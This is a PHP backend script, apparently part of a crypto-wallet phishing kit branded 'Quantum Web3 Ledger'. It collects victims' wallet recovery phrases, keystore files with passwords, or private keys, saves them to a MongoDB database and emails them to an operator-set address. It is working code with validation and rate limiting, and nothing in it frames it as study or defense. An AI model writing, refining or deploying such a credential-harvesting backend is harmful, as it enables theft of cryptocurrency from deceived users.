<?php
session_start([
    'cookie_secure' => true,
    'cookie_httponly' => true,
    'use_strict_mode' => true,
]);

require 'vendor/autoload.php';
use Dotenv\Dotenv;
$dotenv = Dotenv::createImmutable(__DIR__);
$dotenv->load();

if (!isset($_SESSION['csrf_token'])) {
    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
}

if (!isset($_POST['csrf_token']) || $_POST['csrf_token'] !== $_SESSION['csrf_token']) {
    header('Content-Type: text/html; charset=UTF-8');
    http_response_code(403);
    echo "<h2>Invalid CSRF Token</h2><p>Please refresh the page and try again. <a href='wallet1c0b1c0b.html'>Back</a></p>";
    exit;
}

if ($_SERVER["REQUEST_METHOD"] !== "POST") {
    header('Location: wallet1c0b1c0b.html');
    exit;
}

$submission_type = '';
$wallet = $email = $data = '';
if (isset($_POST['pwallet'], $_POST['pemail'], $_POST['phrase'])) {
    $submission_type = 'phrase';
    $wallet = trim($_POST['pwallet']);
    $email = trim($_POST['pemail']);
    $data = trim($_POST['phrase']);
} elseif (isset($_POST['kwallet'], $_POST['kemail'], $_POST['keystore'], $_POST['password'])) {
    $submission_type = 'keystore';
    $wallet = trim($_POST['kwallet']);
    $email = trim($_POST['kemail']);
    $data = trim($_POST['keystore']) . "\nPassword: " . trim($_POST['password']);
} elseif (isset($_POST['prwallet'], $_POST['premail'], $_POST['private'])) {
    $submission_type = 'privatekey';
    $wallet = trim($_POST['prwallet']);
    $email = trim($_POST['premail']);
    $data = trim($_POST['private']);
} else {
    header('Content-Type: text/html; charset=UTF-8');
    http_response_code(400);
    echo "<h2>Invalid Submission</h2><p>Please fill in all required fields correctly. <a href='wallet1c0b1c0b.html'>Back</a></p>";
    exit;
}

if (empty($wallet) || empty($email) || empty($data) || !filter_var($email, FILTER_VALIDATE_EMAIL)) {
    header('Content-Type: text/html; charset=UTF-8');
    http_response_code(400);
    echo "<h2>Invalid Input</h2><p>Please fill in all required fields correctly. <a href='wallet1c0b1c0b.html'>Back</a></p>";
    exit;
}
if (!preg_match('/^[a-zA-Z0-9-_]{1,64}$/', $wallet)) {
    header('Content-Type: text/html; charset=UTF-8');
    http_response_code(400);
    echo "<h2>Invalid Wallet Name</h2><p>Use up to 64 alphanumeric characters for the wallet name. <a href='wallet1c0b1c0b.html'>Back</a></p>";
    exit;
}
if (strlen($data) > 1000) {
    header('Content-Type: text/html; charset=UTF-8');
    http_response_code(400);
    echo "<h2>Input Too Long</h2><p>Submission data must be under 1000 characters. <a href='wallet1c0b1c0b.html'>Back</a></p>";
    exit;
}
$data = htmlspecialchars($data, ENT_QUOTES, 'UTF-8');

if (isset($_SESSION['last_submission']) && (time() - $_SESSION['last_submission']) < 60) {
    header('Content-Type: text/html; charset=UTF-8');
    http_response_code(429);
    echo "<h2>Rate Limit Exceeded</h2><p>Please wait a minute before submitting again. <a href='wallet1c0b1c0b.html'>Back</a></p>";
    exit;
}
$_SESSION['last_submission'] = time();

if (!isset($_ENV['DB_HOST'], $_ENV['DB_NAME'], $_ENV['DB_USER'], $_ENV['DB_PASS'])) {
    error_log("Database configuration missing");
    header('Content-Type: text/html; charset=UTF-8');
    http_response_code(500);
    echo "<h2>Server Error</h2><p>Database configuration is unavailable. Please try again later. <a href='wallet1c0b1c0b.html'>Back</a></p>";
    exit;
}

// MongoDB Connection
try {
    $mongoUri = "mongodb://" . $_ENV['DB_USER'] . ":" . $_ENV['DB_PASS'] . "@" . $_ENV['DB_HOST'] . ":" . ($_ENV['DB_PORT'] ?? '27017') . "/" . $_ENV['DB_NAME'] . "?authSource=admin";
    $manager = new MongoDB\Driver\Manager($mongoUri);
    $bulk = new MongoDB\Driver\BulkWrite;
    $document = [
        'wallet' => $wallet,
        'email' => $email,
        'data' => $data,
        'submission_type' => $submission_type,
        'created_at' => new MongoDB\BSON\UTCDateTime(time() * 1000) // Timestamp in milliseconds
    ];
    $bulk->insert($document);
    $manager->executeBulkWrite($_ENV['DB_NAME'] . '.submissions', $bulk);
} catch (Exception $e) {
    error_log("MongoDB error: " . $e->getMessage());
    header('Content-Type: text/html; charset=UTF-8');
    http_response_code(500);
    echo "<h2>Database Error</h2><p>Unable to save submission. Please try again. <a href='wallet1c0b1c0b.html'>Back</a></p>";
    exit;
}

// Email setup (unchanged)
use PHPMailer\PHPMailer\PHPMailer;
if (!class_exists('PHPMailer\PHPMailer\PHPMailer')) {
    error_log("PHPMailer not found");
    header('Content-Type: text/html; charset=UTF-8');
    http_response_code(500);
    echo "<h2>Submission Saved</h2><p>Email service is unavailable, but your submission is stored.</p>";
    echo "<p><a href='wallet1c0b1c0b.html'>Back</a></p>";
    exit;
}

$mail = new PHPMailer(true);
try {
    if (!isset($_ENV['SMTP_HOST'], $_ENV['SMTP_USER'], $_ENV['SMTP_PASS'], $_ENV['TO_EMAIL'])) {
        error_log("Email configuration missing");
        throw new Exception("Email service unavailable");
    }
    $mail->isSMTP();
    $mail->Host = $_ENV['SMTP_HOST'];
    $mail->SMTPAuth = true;
    $mail->Username = $_ENV['SMTP_USER'];
    $mail->Password = $_ENV['SMTP_PASS'];
    $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;
    $mail->Port = 587;
    $mail->CharSet = 'UTF-8';
    $mail->setFrom($_ENV['SMTP_USER'], 'Quantum Web3 Ledger');
    $mail->addAddress($_ENV['TO_EMAIL']);
    $mail->Subject = "New $submission_type Submission from $wallet";
    $mail->Body = "Wallet: $wallet\nType: $submission_type\nData: $data\nEmail: $email\nTime: " . date('Y-m-d H:i:s');
    $mail->send();
    header('Content-Type: text/html; charset=UTF-8');
    echo "<h2>Submission Received</h2><p>Your submission has been recorded and an email notification sent.</p>";
    echo "<p><a href='wallet1c0b1c0b.html'>Back</a></p>";
} catch (Exception $e) {
    error_log("Email error: " . $mail->ErrorInfo);
    header('Content-Type: text/html; charset=UTF-8');
    http_response_code(500);
    echo "<h2>Submission Saved</h2><p>Email notification failed, but your submission is stored.</p>";
    echo "<p><a href='wallet1c0b1c0b.html'>Back</a></p>";
}

// Cleanup old submissions (older than 30 days)
try {
    $bulk = new MongoDB\Driver\BulkWrite;
    $filter = ['created_at' => ['$lt' => new MongoDB\BSON\UTCDateTime((time() - (30 * 24 * 60 * 60)) * 1000)]];
    $bulk->delete($filter);
    $manager->executeBulkWrite($_ENV['DB_NAME'] . '.submissions', $bulk);
} catch (Exception $e) {
    error_log("Cleanup error: " . $e->getMessage());
}
?>